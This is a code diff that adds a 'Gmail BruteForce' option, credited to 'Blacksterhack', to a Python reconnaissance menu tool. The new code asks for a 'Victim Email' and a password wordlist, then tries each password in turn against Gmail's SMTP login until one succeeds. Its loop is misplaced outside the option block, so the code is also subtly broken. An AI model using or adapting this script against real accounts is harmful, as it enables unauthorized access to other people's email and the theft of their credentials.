@@ -1,3 +1,5 @@
+#import modules
+
 from googlesearch import search
 from colorama import Fore, init
 init()
@@ -29,6 +31,8 @@ Menu = """
 6- Sensitive directories on a server.
 7- Information to support access.
 8- IP info Gathering.
+9- Gmail BruteForce.
+
 """
 print(Menu)
 
@@ -106,3 +110,29 @@ if option==8:
 
 	for date in load:
 		print(date + ">>>>" +  load[date])
+
+
+if option==9:
+	import smtplib
+	banner = """
+	000000000000000000000000000000000000000
+	0           Gmail BruteForce          0
+	000000000000000000000000000000000000000
+	By: Blacksterhack.
+	"""
+	print(banner)
+	gmail_server = smtplib.SMTP("smtp.gmail.com", 587)
+	gmail_server.ehlo()
+	gmail_server.starttls()
+	user = input("Type Victim Email: ")
+	Wordlist = input("Type here your Wordlist: ")
+	passwfile = open(Wordlist, "r")
+
+for password in passwfile:
+	try:
+		gmail_server.login(user, password)
+
+		print("[+] Password Found: %s" % password)
+		break;
+	except smtplib.SMTPAuthenticationError:
+		print ("[!] Password Incorrect: %s" % password)
